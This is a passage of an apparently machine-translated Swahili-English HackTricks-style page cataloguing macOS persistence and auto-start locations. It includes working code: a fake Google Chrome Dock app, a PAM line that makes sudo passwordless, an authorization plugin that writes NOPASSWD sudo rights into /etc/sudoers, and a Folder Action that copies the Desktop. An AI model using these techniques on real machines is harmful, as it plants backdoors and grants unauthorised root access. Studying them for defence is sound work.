- Unahitaji **kuendesha** **`at`** na lazima iwe **imewezeshwa**

#### **Maelezo**

Kazi za `at` zimetengenezwa kwa ajili ya **kupanga kazi za mara moja** zitekelezwe kwa wakati maalum. Tofauti na cron jobs, kazi za `at` zinaondolewa kiotomatiki baada ya utekelezaji. Ni muhimu kutambua kuwa kazi hizi zinabaki hata baada ya kuanzisha upya mfumo, jambo ambalo linaweza kuzifanya kuwa wasiwasi wa usalama chini ya masharti fulani.

Kwa chaguo-msingi zimeshizimwa, lakini mtumiaji **root** anaweza kuziwasha kwa:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Hii itaunda faili ndani ya saa moja:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Angalia foleni ya kazi kwa kutumia `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Hapo juu tunaweza kuona kazi mbili zilizopangwa. Tunaweza kuonyesha maelezo ya kazi kwa kutumia `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Ikiwa AT tasks hazijawezeshwa, kazi zilizoundwa hazitatekelezwa.

Faili za **kazi** zipo katika `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Jina la faili lina queue, nambari ya job, na wakati uliopangwa kuendeshwa. Kwa mfano, angalia `a0001a019bdcd2`.

- `a` - hii ni queue
- `0001a` - nambari ya job kwa hex, `0x1a = 26`
- `019bdcd2` - wakati kwa hex. Inawakilisha dakika zilizopita tangu epoch. `0x019bdcd2` ni `26991826` kwa decimal. Ikiwa tutaiweka kwenye 60 tunapata `1619509560`, ambayo ni `GMT: 2021. April 27., Tuesday 7:46:00`.

Kama tutachapisha job file, tunagundua kuwa ina taarifa ile ile tuliyopata kwa kutumia `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- But you need to be able to call `osascript` with arguments to contact **`System Events`** to be able to configure Folder Actions
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- It has some basic TCC permissions like Desktop, Documents and Downloads

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Root required
- **Trigger**: Access to the specified folder
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Access to the specified folder

#### Description & Exploitation

Folder Actions are scripts automatically triggered by changes in a folder such as adding, removing items, or other actions like opening or resizing the folder window. These actions can be utilized for various tasks, and can be triggered in different ways like using the Finder UI or terminal commands.

To set up Folder Actions, you have options like:

1. Crafting a Folder Action workflow with [Automator](https://support.apple.com/guide/automator/welcome/mac) and installing it as a service.
2. Attaching a script manually via the Folder Actions Setup in the context menu of a folder.
3. Utilizing OSAScript to send Apple Event messages to the `System Events.app` for programmatically setting up a Folder Action.
- This method is particularly useful for embedding the action into the system, offering a level of persistence.

The following script is an example of what can be executed by a Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Ili kufanya skripti hapo juu itumike na Folder Actions, i-compile kwa kutumia:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Baada ya script kukusanywa, weka Folder Actions kwa kuendesha script ifuatayo. Script hii itawezesha Folder Actions kwa mfumo mzima na itaambatisha kwa mahususi script iliyokusanywa hapo awali kwenye folda ya Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Endesha script ya kusanidi kwa:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Hii ndiyo njia ya kutekeleza persistence kupitia GUI:

Hii ndiyo script itakayotekelezwa:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Icompile kwa: `osacompile -l JavaScript -o folder.scpt source.js`

Hamisha kwa:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Kisha, fungua app ya `Folder Actions Setup`, chagua **folda unayotaka kuangalia** na chagua kwa kesi yako **`folder.scpt`** (kwangu niliiita output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Sasa, ukifungua folda hiyo kwa **Finder**, script yako itaendeshwa.

Configuration hii ilihifadhiwa katika **plist** iliyoko katika **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** kwa muundo wa base64.

Sasa, tujaribu kuandaa persistence hii bila upatikanaji wa GUI:

1. **Nakili `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** kwenda `/tmp` ili kuihifadhi kama chelezo:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Ondoa** Folder Actions uliyoweka:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Sasa tukiwa na mazingira tupu

3. Nakili faili la chelezo: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Fungua Folder Actions Setup.app ili kutumia config hii: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Na hili halikufanya kazi kwangu, lakini haya ndiyo maagizo kutoka kwenye writeup:(

### Vifupi vya Dock

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Inafaa kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini unahitaji kuwa umeweka programu hatarishi ndani ya mfumo
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- `~/Library/Preferences/com.apple.dock.plist`
- **Kichocheo**: Wakati mtumiaji anabonyeza kwenye app ndani ya dock

#### Maelezo & Utekelezaji

Programu zote zinazoonekana kwenye Dock zimeelezwa ndani ya plist: **`~/Library/Preferences/com.apple.dock.plist`**

Inawezekana **kuongeza programu** tu kwa:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Kwa kutumia baadhi ya **social engineering** unaweza **impersonate for example Google Chrome** ndani ya dock na kwa kweli utekeleze script yako mwenyewe:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Vichaguaji vya Rangi

Maelezo: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Inafaa kuepuka sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Inahitaji hatua maalum
- Utamalizika katika sandbox nyingine
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Eneo

- `/Library/ColorPickers`
- Root inahitajika
- Kichocheo: Tumia chaguaji rangi
- `~/Library/ColorPickers`
- Kichocheo: Tumia chaguaji rangi

#### Maelezo & Exploit

**Jenga chaguaji rangi** bundle pamoja na msimbo wako (unaweza kutumia [**this one for example**](https://github.com/viktorstrate/color-picker-plus)) na ongeza constructor (kama katika [Screen Saver section](macos-auto-start-locations.md#screen-saver)) kisha nakili bundle hadi `~/Library/ColorPickers`.

Kisha, wakati chaguaji rangi itakapochochewa, msimbo wako pia utatekelezwa.

Kumbuka kwamba binary inayopakia library yako ina **sandbox yenye vikwazo vikali**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Maelezo**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Maelezo**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Inafaa ku-bypass sandbox: **Hapana, kwa sababu unahitaji kuendesha app yako mwenyewe**
- TCC bypass: ???

#### Mahali

- App maalum

#### Maelezo & Exploit

Mfano wa application yenye Finder Sync Extension [**inaweza kupatikana hapa**](https://github.com/D00MFist/InSync).

Applications zinaweza kuwa na `Finder Sync Extensions`. Extension hii itawekwa ndani ya application itakayotekelezwa. Zaidi ya hayo, ili extension iweze kutekeleza msimbo wake **inapaswa kusainiwa** na cheti halali cha Apple developer, inapaswa kuwa **sandboxed** (ingawa relaxed exceptions could be added) na inapaswa kusajiliwa kwa kitu kama:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Uandishi: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Uandishi: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Inafaa kwa bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini utamalizika katika sandbox ya programu ya kawaida
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/System/Library/Screen Savers`
- Inahitaji root
- **Trigger**: Chagua the Screen Saver
- `/Library/Screen Savers`
- Inahitaji root
- **Trigger**: Chagua the Screen Saver
- `~/Library/Screen Savers`
- **Trigger**: Chagua the Screen Saver

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Description & Exploit

Unda mradi mpya katika Xcode na chagua template ili kutengeneza **Screen Saver** mpya. Kisha, ongeza code yako ndani yake — kwa mfano, kifungu kinachotengeneza logs.

**Build** hiyo, na nakili bundle ya `.saver` hadi **`~/Library/Screen Savers`**. Kisha, fungua GUI ya Screen Saver na ukibonye tu juu yake, itapaswa kuzalisha logi nyingi:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Kumbuka kwamba kwa kuwa ndani ya entitlements za binary inayopakia msimbo huu (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) unaweza kupata **`com.apple.security.app-sandbox`**, utakuwa **ndani ya sandbox ya kawaida ya programu**.

Msimbo wa ScreenSaver:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Inafaa kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini utamalizika ndani ya sandbox ya application
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- sandbox inaonekana kuwa na mipaka sana

#### Location

- `~/Library/Spotlight/`
- **Trigger**: Faili mpya yenye extension inayosimamiwa na Spotlight plugin imeundwa.
- `/Library/Spotlight/`
- **Trigger**: Faili mpya yenye extension inayosimamiwa na Spotlight plugin imeundwa.
- Root required
- `/System/Library/Spotlight/`
- **Trigger**: Faili mpya yenye extension inayosimamiwa na Spotlight plugin imeundwa.
- Root required
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Faili mpya yenye extension inayosimamiwa na Spotlight plugin imeundwa.
- New app required

#### Description & Exploitation

Spotlight ni kipengele cha utafutaji kilichojengwa ndani ya macOS, kilichobuniwa kutoa watumiaji **upatikanaji wa haraka na wa kina kwa data kwenye kompyuta zao**.\
Ili kuwezesha uwezo huu wa utafutaji wa haraka, Spotlight inatunza **database ya proprietary** na huunda index kwa **kuchambua faili nyingi**, kuruhusu utafutaji wa haraka kupitia majina ya faili na yaliyomo ndani yao.

Mfumo wa msingi wa Spotlight unahusika na mchakato mkuu uitwao 'mds', ambao unasimama kwa **'metadata server'.** Mchakato huu unaoratibu huduma yote ya Spotlight. Zaidi ya hayo, kuna daemons kadhaa 'mdworker' zinazofanya kazi mbalimbali za matengenezo, kama vile kuorodhesha aina tofauti za faili (`ps -ef | grep mdworker`). Kazi hizi zinawezekana kwa kupitia Spotlight importer plugins, au **".mdimporter bundles"**, ambazo zinamuwezesha Spotlight kuelewa na kuorodhesha yaliyomo katika aina mbalimbali za muundo wa faili.

Plugins au **`.mdimporter`** bundles zipo katika maeneo yaliyotajwa hapo juu na ikiwa bundle mpya itaonekana inapakiwa ndani ya dakika (hakuna haja ya kuanzisha tena huduma yoyote). Bundles hizi zinapaswa kuonyesha ni **aina ya faili na extensions zipi wanazoweza kusimamia**, kwa njia hiyo, Spotlight itazitumia wakati faili mpya yenye extension iliyotajwa imetengenezwa.

Inawezekana **kupata `mdimporters` zote** zilizo yük ili kukimbia:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Na kwa mfano **/Library/Spotlight/iBooksAuthor.mdimporter** hutumika kuchambua aina hizi za faili (viendelezi `.iba` na `.book` miongoni mwa vingine):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Ukikagua Plist ya `mdimporter` nyingine huenda usipate kipengele **`UTTypeConformsTo`**. Hii ni kwa sababu hiyo ni built-in _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) na haitegemei kuonyesha extensions.
>
> Zaidi ya hayo, System default plugins zinachukua kipaumbele kila wakati, kwa hivyo mshambuliaji anaweza kufikia tu faili ambazo hazijaorodheshwa na `mdimporters` za Apple.

Ili kuunda importer yako mwenyewe unaweza kuanza na mradi huu: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) kisha badilisha jina, **`CFBundleDocumentTypes`** na ongeza **`UTImportedTypeDeclarations`** ili iunge mkono extension unayotaka na ziakisi katika **`schema.xml`**.\
Kisha **badilisha** msimbo wa function **`GetMetadataForFile`** ili kutekeleza payload yako wakati faili yenye extension iliyoproseswa inapoanzishwa.

Mwishowe **jenga na nakili `.mdimporter`** yako mpya kwenye moja ya maeneo yaliyotajwa hapo juu na unaweza kuona ikiwa imepakiwa kwa **kusimamia logs** au kuangalia **`mdimport -L.`**

### ~~Preference Pane~~

> [!CAUTION]
> Inaonekana hili halifanyi kazi tena.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Inafaa kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Inahitaji kitendo maalum cha mtumiaji
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Inaonekana hili halifanyi kazi tena.

## Root Sandbox Bypass

> [!TIP]
> Hapa unaweza kupata maeneo ya kuanzia yanayofaa kwa **sandbox bypass** ambayo yanakuwezesha tu kutekeleza kitu kwa **kuandika kwake katika faili** ukiwa **root** na/au kuhitaji masharti mengine **yasiyo ya kawaida.**

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Inafaa kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Inahitaji root
- **Trigger**: Wakati muda unafika
- `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local`
- Inahitaji root
- **Trigger**: Wakati muda unafika

#### Description & Exploitation

Script za periodic (**`/etc/periodic`**) zinaendeshwa kwa sababu ya **launch daemons** zilizoainishwa katika `/System/Library/LaunchDaemons/com.apple.periodic*`. Kumbuka kwamba script zilizohifadhiwa katika `/etc/periodic/` zina **tekelezwa** kama **mmiliki wa faili,** hivyo hii haitafanya kazi kwa ongezeko la cheo la ruhusa.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Kuna periodic scripts nyingine ambazo zitatekelezwa zilizoonyeshwa katika **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Iwapo utafanikiwa kuandika yoyote ya faili `/etc/daily.local`, `/etc/weekly.local` au `/etc/monthly.local` itatekelezwa mapema au baadaye.

> [!WARNING]
> Kumbuka kwamba periodic script **itatekelezwa kama mmiliki wa script**. Hivyo ikiwa mtumiaji wa kawaida ndiye mmiliki wa script, itatekelezwa kama mtumiaji huyo (hii inaweza kuzuia privilege escalation attacks).

### PAM

Maelezo: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Maelezo: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Inafaa ku-bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- Root inahitajika kila wakati

#### Maelezo & Exploitation

Kwa kuwa PAM inalenga zaidi kwenye **persistence** na malware kuliko kwenye utekelezaji rahisi ndani ya macOS, blogi hii haitatoa maelezo ya kina; **soma writeups ili kuelewa mbinu hii vizuri zaidi**.

Angalia PAM modules na:
```bash
ls -l /etc/pam.d
```
Mbinu ya persistence/privilege escalation inayotumia PAM ni rahisi kama kurekebisha module /etc/pam.d/sudo kwa kuongeza mwanzoni mstari ufuatao:
```bash
auth       sufficient     pam_permit.so
```
Kwa hivyo itakuwa **itaonekana** hivi:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Na kwa hivyo jaribio lolote la kutumia **`sudo` litafanya kazi**.

> [!CAUTION]
> Kumbuka kuwa saraka hii inalindwa na TCC, hivyo kuna uwezekano mkubwa kwamba mtumiaji atapokea ombi la ruhusa.

Mfano mwingine mzuri ni su, ambapo unaweza kuona kwamba pia inawezekana kutoa vigezo kwa PAM modules (na unaweza pia backdoor faili hii):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Inafaa ku-bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root na kufanya usanidi wa ziada
- TCC bypass: ???

#### Location

- `/Library/Security/SecurityAgentPlugins/`
- Inahitaji root
- Inahitajika pia kusanidi authorization database ili kutumia plugin

#### Description & Exploitation

Unaweza kuunda authorization plugin ambayo itaendeshwa wakati mtumiaji anapoingia (logs-in) ili kudumisha persistence. Kwa maelezo zaidi kuhusu jinsi ya kuunda moja ya plugins hizi angalia writeups zilizotangulia (na kuwa mwangalifu, plugin iliyoandikwa vibaya inaweza kukufunga nje na utahitaji kusafisha mac yako kutoka recovery mode).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Hamisha** bundle hadi mahali litakapopakiwa:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Hatimaye ongeza **kanuni** ili kupakia Plugin hii:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Kipengele **`evaluate-mechanisms`** kitaeleza mfumo wa idhini kwamba kinahitaji **kuitisha mekanismo wa nje kwa ajili ya idhini**. Aidha, **`privileged`** itafanya ifanyike kwa root.

Iitishwe kwa:
```bash
security authorize com.asdf.asdf
```
Na kisha **kikundi cha staff kinapaswa kuwa na sudo** access (soma `/etc/sudoers` ili kuthibitisha).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Inafaa kwa bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root na mtumiaji lazima atumie man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`/private/etc/man.conf`**
- Root required
- **`/private/etc/man.conf`**: Kila wakati man inapotumika

#### Maelezo & Exploit

The config file **`/private/etc/man.conf`** inaonyesha binary/script itakayotumika wakati wa kufungua faili za dokumenti za man. Kwa hivyo path ya executable inaweza kubadilishwa ili kila wakati mtumiaji atakapotumia man kusoma baadhi ya nyaraka, backdoor ianze kutekelezwa.

Kwa mfano weka katika **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Kisha unda `/tmp/view` kama:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Uandishi**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Inafaa kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root na apache lazima iwe inakimbia
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd haina entitlements

